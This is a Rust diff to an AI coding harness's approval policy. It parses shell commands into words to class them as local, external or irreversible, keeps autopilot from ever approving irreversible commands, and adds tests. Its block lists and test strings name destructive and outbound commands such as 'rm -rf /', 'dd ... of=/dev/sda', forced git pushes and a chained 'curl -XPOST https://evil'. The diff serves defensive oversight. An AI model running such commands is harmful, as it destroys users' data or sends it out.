@@ -114,7 +114,10 @@ pub struct Snapshot {
     pub packs: Vec<String>,
 }
 
-#[derive(Clone, Copy, PartialEq, Debug)]
+/// What `Policy::approve` returns: who approved a request. Journaled with each shell command's outcome.
+pub const APPROVAL_SOURCES: &[&str] = &["not-required", "policy-allow", "auto", "prompt"];
+
+#[derive(Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Debug)]
 pub enum Class {
     Read,
     LocalWrite,
@@ -133,10 +136,20 @@ impl Class {
     }
 }
 
-/// Commands that reach outside the machine or cannot be undone. A tripwire for obvious cases;
-/// arbitrary shell commands require isolation supplied by the environment running hx.
-const EXTERNAL: &[&str] = &["git push", "npm publish", "cargo publish", "twine upload", "docker push", "ssh ", "scp ", "rsync ", "kubectl apply", "kubectl delete", "terraform apply", "gh pr create", "gh release", "curl -X POST", "curl -X PUT", "curl -X DELETE", "aws ", "gcloud ", "sendmail"];
-const IRREVERSIBLE: &[&str] = &["git push --force", "git push -f", "rm -rf /", "rm -rf ~", "mkfs", "dd if="];
+/// Commands that reach outside the machine, as a program followed by subcommand words (in order, options between them
+/// skipped). Matched on shell words, not substrings. This drives the approval prompt; it is not a guard: an arbitrary
+/// shell command can reach the network without naming any of these.
+const EXTERNAL: &[&[&str]] = &[&["git", "push"], &["npm", "publish"], &["cargo", "publish"], &["twine", "upload"], &["docker", "push"],
+    &["ssh"], &["scp"], &["rsync"], &["kubectl", "apply"], &["kubectl", "delete"], &["terraform", "apply"], &["gh", "pr", "create"],
+    &["gh", "release"], &["aws"], &["gcloud"], &["sendmail"]];
+/// `curl` methods that send data.
+const CURL_WRITES: &[&str] = &["POST", "PUT", "PATCH", "DELETE"];
+/// `git push` arguments that rewrite or delete remote history.
+const PUSH_DESTRUCTIVE: &[&str] = &["--force", "--force-with-lease", "--force-if-includes", "--delete", "--mirror", "--prune"];
+/// `rm -r` targets that are the whole filesystem or home directory.
+const RM_ROOTS: &[&str] = &["/", "/*", "~", "~/", "~/*", "$HOME", "$HOME/", "$HOME/*", "${HOME}", "${HOME}/", "${HOME}/*"];
+/// Programs that run the rest of their words as a command.
+const WRAPPERS: &[&str] = &["sudo", "env", "command", "exec", "nohup", "time", "nice", "xargs", "timeout", "doas"];
 
 const SYSTEM_READ: &[&str] = &["/usr", "/bin", "/sbin", "/etc", "/dev", "/opt"];
 /// Credential files blocked by file tools, even inside an allowed read root.
@@ -149,6 +162,143 @@ pub fn is_secret(path: &Path) -> bool {
 
 const ENV_ALLOW: &[&str] = &["PATH", "LANG", "LC_ALL", "LC_CTYPE", "TERM", "USER", "LOGNAME", "SHELL"];
 const TOOLS: &[&str] = &["python3", "python", "pip3", "node", "npm", "npx", "git", "cargo", "rustc", "go", "uv", "ruby", "java", "make", "gcc", "clang", "deno", "bun"];
+
+/// Split a shell command line into its simple commands, each a list of words. POSIX-ish: single and double quotes,
+/// backslash escapes, comments, the operators `; & | ( )` and newlines between commands, and redirections. The bodies
+/// of `$(...)` and backticks become commands of their own. It does not expand variables or aliases.
+fn commands(line: &str) -> Vec<Vec<String>> {
+    fn body(chars: &[char], mut i: usize, close: char) -> (String, usize) {
+        // From just after `$(` or a backtick to its matching close; returns the body and the index after the close.
+        let (mut depth, mut out) = (0usize, String::new());
+        while i < chars.len() {
+            let c = chars[i];
+            if c == '\\' && i + 1 < chars.len() { out.push(c); out.push(chars[i + 1]); i += 2; continue; }
+            if close == ')' && c == '(' { depth += 1; }
+            if c == close { if depth == 0 { return (out, i + 1); } depth -= 1; }
+            out.push(c);
+            i += 1;
+        }
+        (out, i)
+    }
+    let chars: Vec<char> = line.chars().collect();
+    let (mut cmds, mut cur, mut word): (Vec<Vec<String>>, Vec<String>, Option<String>) = (vec![], vec![], None);
+    let end_word = |cur: &mut Vec<String>, word: &mut Option<String>| if let Some(w) = word.take() { cur.push(w); };
+    let mut i = 0;
+    while i < chars.len() {
+        let c = chars[i];
+        match c {
+            ' ' | '\t' => end_word(&mut cur, &mut word),
+            ';' | '&' | '|' | '\n' | '(' | ')' => {
+                end_word(&mut cur, &mut word);
+                if !cur.is_empty() { cmds.push(std::mem::take(&mut cur)); }
+            },
+            '<' | '>' => {
+                end_word(&mut cur, &mut word);
+                if chars.get(i + 1) == Some(&'&') { i += 1; } // `>&2` duplicates a descriptor; it ends no command
+            },
+            '#' if word.is_none() => { while i < chars.len() && chars[i] != '\n' { i += 1; } continue; },
+            '\'' => {
+                let w = word.get_or_insert_with(String::new);
+                i += 1;
+                while i < chars.len() && chars[i] != '\'' { w.push(chars[i]); i += 1; }
+            },
+            '"' => {
+                word.get_or_insert_with(String::new);
+                i += 1;
+                while i < chars.len() && chars[i] != '"' {
+                    match chars[i] {
+                        '\\' if i + 1 < chars.len() && matches!(chars[i + 1], '"' | '\\' | '$' | '`') => { word.as_mut().unwrap().push(chars[i + 1]); i += 2; },
+                        '$' if chars.get(i + 1) == Some(&'(') => { let (b, next) = body(&chars, i + 2, ')'); cmds.extend(commands(&b)); i = next; },
+                        '`' => { let (b, next) = body(&chars, i + 1, '`'); cmds.extend(commands(&b)); i = next; },
+                        ch => { word.as_mut().unwrap().push(ch); i += 1; },
+                    }
+                }
+            },
+            '\\' => {
+                if let Some(&next) = chars.get(i + 1) {
+                    if next != '\n' { word.get_or_insert_with(String::new).push(next); }
+                    i += 1;
+                }
+            },
+            '$' if chars.get(i + 1) == Some(&'(') => { let (b, next) = body(&chars, i + 2, ')'); cmds.extend(commands(&b)); i = next; continue; },
+            '`' => { let (b, next) = body(&chars, i + 1, '`'); cmds.extend(commands(&b)); i = next; continue; },
+            ch => word.get_or_insert_with(String::new).push(ch),
+        }
+        i += 1;
+    }
+    end_word(&mut cur, &mut word);
+    if !cur.is_empty() { cmds.push(cur); }
+    cmds
+}
+
+/// The effect class of one simple command (its words, as `commands` splits them).
+fn class_of(words: &[String]) -> Class {
+    // Skip variable assignments and wrappers (`sudo`, `env X=1`, `timeout 5`) to the program that actually runs.
+    let mut i = 0;
+    while i < words.len() {
+        let w = words[i].as_str();
+        let assignment = w.split_once('=').is_some_and(|(k, _)| !k.is_empty() && k.chars().all(|c| c.is_ascii_alphanumeric() || c == '_'));
+        if assignment || w.starts_with('-') || (i > 0 && WRAPPERS.contains(&words[i - 1].as_str()) && w.parse::<f64>().is_ok()) {
+            i += 1;
+        } else if WRAPPERS.contains(&program(w)) {
+            i += 1;
+        } else {
+            break;
+        }
+    }
+    let Some(first) = words.get(i) else { return Class::LocalWrite };
+    let (prog, args) = (program(first), &words[i + 1..]);
+    match prog {
+        "bash" | "sh" | "zsh" | "dash" | "ksh" => {
+            // `bash -c 'script'` runs its script; `bash -lc` too.
+            let script = args.iter().position(|a| a.starts_with('-') && !a.starts_with("--") && a.contains('c')).and_then(|p| args.get(p + 1));
+            return script.map(|s| commands(s).iter().map(|c| class_of(c)).max().unwrap_or(Class::LocalWrite)).unwrap_or(Class::LocalWrite);
+        },
+        "eval" => return commands(&args.join(" ")).iter().map(|c| class_of(c)).max().unwrap_or(Class::LocalWrite),
+        "mkfs" => return Class::Irreversible,
+        p if p.starts_with("mkfs.") => return Class::Irreversible,
+        "dd" if args.iter().any(|a| a.starts_with("if=") || a.starts_with("of=")) => return Class::Irreversible,
+        "rm" => {
+            let recursive = args.iter().any(|a| a == "--recursive" || (a.starts_with('-') && !a.starts_with("--") && (a.contains('r') || a.contains('R'))));
+            let root = args.iter().any(|a| RM_ROOTS.contains(&a.as_str()) || a.trim_end_matches('/').is_empty() && a.starts_with('/'));
+            return if recursive && root { Class::Irreversible } else { Class::LocalWrite };
+        },
+        "git" => {
+            // `git -C dir -c k=v push ...`: options that take a value come before the subcommand.
+            let mut j = 0;
+            while j < args.len() && args[j].starts_with('-') { j += if matches!(args[j].as_str(), "-C" | "-c") { 2 } else { 1 }; }
+            if args.get(j).map(String::as_str) == Some("push") {
+                let destructive = args[j + 1..].iter().any(|a| PUSH_DESTRUCTIVE.iter().any(|d| a == d || a.starts_with(&format!("{d}=")))
+                    || (a.starts_with('-') && !a.starts_with("--") && (a.contains('f') || a.contains('d')))
+                    || ((a.starts_with('+') || a.starts_with(':')) && a.len() > 1));
+                return if destructive { Class::Irreversible } else { Class::External };
+            }
+            return Class::LocalWrite;
+        },
+        "curl" => {
+            let method = args.iter().enumerate().find_map(|(k, a)| {
+                if a == "-X" || a == "--request" { args.get(k + 1).cloned() }
+                else { a.strip_prefix("--request=").or_else(|| a.strip_prefix("-X")).filter(|m| !m.is_empty()).map(String::from) }
+            });
+            let sends = args.iter().any(|a| matches!(a.as_str(), "-d" | "--data" | "--data-raw" | "--data-binary" | "--data-urlencode" | "-F" | "--form" | "-T" | "--upload-file"));
+            return if sends || method.is_some_and(|m| CURL_WRITES.contains(&m.to_ascii_uppercase().as_str())) { Class::External } else { Class::LocalWrite };
+        },
+        _ => {},
+    }
+    let external = EXTERNAL.iter().any(|pattern| {
+        // The subcommand words appear in order among the arguments, options and their values in between.
+        pattern[0] == prog && {
+            let mut rest = args.iter();
+            pattern[1..].iter().all(|want| rest.any(|a| a == want))
+        }
+    });
+    if external { Class::External } else { Class::LocalWrite }
+}
+
+/// A command word's program name: `/usr/bin/git` is `git`.
+fn program(word: &str) -> &str {
+    word.rsplit('/').next().unwrap_or(word)
+}
 
 fn canon(p: impl AsRef<Path>) -> Option<PathBuf> {
     std::fs::canonicalize(p).ok()
@@ -304,33 +454,54 @@ impl Policy {
 
     pub fn snapshot(&self) -> Snapshot { self.cfg.clone() }
 
-    /// Effect class of a shell command.
+    /// Effect class of a shell command: the highest class of its simple commands.
     pub fn classify_sh(&self, cmd: &str) -> Class {
-        if IRREVERSIBLE.iter().any(|p| cmd.contains(p)) {
-            Class::Irreversible
-        } else if EXTERNAL.iter().any(|p| cmd.contains(p)) || self.ask.iter().any(|p| cmd.contains(p.as_str())) {
-            Class::External
-        } else {
-            Class::LocalWrite
-        }
+        self.segments(cmd).into_iter().map(|(_, c)| c).max().unwrap_or(Class::LocalWrite)
+            .max(if self.ask.iter().any(|p| cmd.contains(p.as_str())) { Class::External } else { Class::LocalWrite })
     }
 
-    /// The approval gate. Returns the approval source, or the reason it was refused. The run's
-    /// approval settings are frozen in Rust; Luau code and hooks cannot change them.
+    /// Each simple command of `cmd` (words joined by single spaces) with its effect class.
+    fn segments(&self, cmd: &str) -> Vec<(String, Class)> {
+        commands(cmd).into_iter().map(|words| {
+            let text = words.join(" ");
+            let class = class_of(&words).max(if self.ask.iter().any(|p| text.contains(p.as_str())) { Class::External } else { Class::LocalWrite });
+            (text, class)
+        }).collect()
+    }
+
+    /// The approval gate. Returns the approval source ("not-required", "policy-allow", "auto" or "prompt"), or the
+    /// reason it was refused. The run's approval settings are frozen in Rust; Luau code and hooks cannot change them.
+    /// `--yes` approves external requests but never an irreversible one: that needs an exact `allow` entry or the
+    /// owner's answer on the terminal.
     pub async fn approve(&self, cmd: &str, class: Class) -> std::result::Result<&'static str, String> {
-        if self.autopilot { return Ok("auto"); }
         if matches!(class, Class::Read | Class::LocalWrite) { return Ok("not-required"); }
-        let preapproved = if class == Class::Irreversible { self.allow.iter().any(|a| a == cmd) } else { self.allow.iter().any(|a| cmd.contains(a.as_str())) };
-        if preapproved { return Ok("policy-allow"); }
+        if class == Class::Irreversible {
+            if self.allow.iter().any(|a| a.trim() == cmd.trim()) { return Ok("policy-allow"); }
+        } else if self.autopilot {
+            return Ok("auto");
+        } else if self.allowed(cmd) {
+            return Ok("policy-allow");
+        }
         if self.mode == ApprovalMode::Prompt {
             let _guard = self.prompt.lock().await;
             return match ask(&format!("{} command:\n  {cmd}", class.name())).await {
                 Ok(true) => Ok("prompt"),
                 Ok(false) => Err("the user declined; it was NOT run".into()),
+                Err(_) if class == Class::Irreversible => Err("this is an irreversible effect and there is no controlling terminal to ask; it was NOT run (--yes never approves irreversible commands; add the exact command to [approval] allow)".into()),
                 Err(e) => Err(e.to_string()),
             };
         }
-        Err(format!("this is an {} effect and needs the user's approval; it was NOT run (set [approval] allow, use --approval prompt, or launch with --yes)", class.name()))
+        let how = if class == Class::Irreversible { "add the exact command to [approval] allow or use --approval prompt" } else { "set [approval] allow, use --approval prompt, or launch with --yes" };
+        Err(format!("this is an {} effect and needs the user's approval; it was NOT run ({how})", class.name()))
+    }
+
+    /// An external request is pre-approved when an `allow` entry covers each of its external simple commands, so an
+    /// entry for one command cannot approve another chained after it. A request that is not a shell command (an MCP or
+    /// HTTP label) is matched as a whole.
+    fn allowed(&self, cmd: &str) -> bool {
+        let covered = |text: &str| self.allow.iter().any(|a| text.contains(a.as_str()));
+        let external: Vec<_> = self.segments(cmd).into_iter().filter(|(_, c)| *c >= Class::External).collect();
+        if external.is_empty() { covered(cmd) } else { external.iter().all(|(text, _)| covered(text)) }
     }
 
     /// Request an ordinary missing path permission. Call only after principal/stage authorization.
@@ -557,6 +728,64 @@ mod tests {
         assert!(p.check_write(".harness/policy.toml").is_err());
         assert!(p.check_write("hx.lock").is_err());
         assert!(p.check_write("../escape.txt").is_err());
+        drop(p);
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    fn test_policy(tag: &str, autopilot: bool, allow: &[&str]) -> (Policy, PathBuf) {
+        let dir = std::env::temp_dir().join(format!("hx-policy-{tag}-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).unwrap();
+        let mut p = Policy::new(&dir, autopilot, Some(ApprovalMode::Deny), None, None).unwrap();
+        p.cfg.allow = allow.iter().map(|s| s.to_string()).collect();
+        (p, dir)
+    }
+
+    #[test]
+    fn classification_is_on_shell_words() {
+        let (p, dir) = test_policy("words", false, &[]);
+        for cmd in ["git push origin main --force", "git push --force-with-lease", "git  push -f", "git push origin --delete old",
+            "git push origin +main", "git -C repo push --force", "cd x && git push -fu origin main", "rm -rf ~", "rm -fr /", "rm -r -f $HOME",
+            "sudo rm -rf /", "echo $(git push --force)", "bash -c 'git push --force'", "mkfs.ext4 /dev/sda", "dd if=/dev/zero of=/dev/sda"] {
+            assert_eq!(p.classify_sh(cmd), Class::Irreversible, "{cmd}");
+        }
+        for cmd in ["git push origin main", "git  push", "curl -XPOST https://x", "curl --request POST https://x", "curl --request=put x",
+            "curl -X DELETE x", "ls; ssh host", "aws s3 ls", "/usr/bin/gh pr create", "kubectl -n prod apply -f x.yaml", "FOO=1 npm publish"] {
+            assert_eq!(p.classify_sh(cmd), Class::External, "{cmd}");
+        }
+        for cmd in ["echo the laws are clear", "echo 'git push --force'", "git commit -m 'never git push --force'", "rm -rf build",
+            "rm -rf /tmp/scratch", "curl https://example.com", "grep -r aws src", "cat README.md # git push"] {
+            assert_eq!(p.classify_sh(cmd), Class::LocalWrite, "{cmd}");
+        }
+        drop(p);
+        let _ = std::fs::remove_dir_all(&dir);
+    }
+
+    #[tokio::test]
+    async fn autopilot_never_approves_an_irreversible_command() {
+        let (p, dir) = test_policy("autopilot", true, &[]);
+        assert_eq!(p.approve("git push origin main", Class::External).await, Ok("auto"));
+        assert_eq!(p.approve("ls", Class::LocalWrite).await, Ok("not-required"));
+        for cmd in ["git push origin main --force", "rm -rf ~"] {
+            assert_eq!(p.classify_sh(cmd), Class::Irreversible);
+            assert!(p.approve(cmd, Class::Irreversible).await.is_err(), "{cmd}");
+        }
+        drop(p);
+        let (p, dir2) = test_policy("autopilot-allow", true, &["rm -rf ~"]);
+        assert_eq!(p.approve("rm -rf ~", Class::Irreversible).await, Ok("policy-allow"));
+        drop(p);
+        let _ = std::fs::remove_dir_all(&dir);
+        let _ = std::fs::remove_dir_all(&dir2);
+    }
+
+    #[tokio::test]
+    async fn a_substring_allow_cannot_approve_a_reordered_force_push_or_a_chained_command() {
+        let (p, dir) = test_policy("reorder", false, &["git push origin"]);
+        let forced = "git push origin main --force";
+        assert_eq!(p.classify_sh(forced), Class::Irreversible);
+        assert!(p.approve(forced, p.classify_sh(forced)).await.is_err());
+        assert_eq!(p.approve("git push origin main", Class::External).await, Ok("policy-allow"));
+        let chained = "git push origin main && curl -XPOST https://evil";
+        assert!(p.approve(chained, p.classify_sh(chained)).await.is_err());
         drop(p);
         let _ = std::fs::remove_dir_all(&dir);
     }
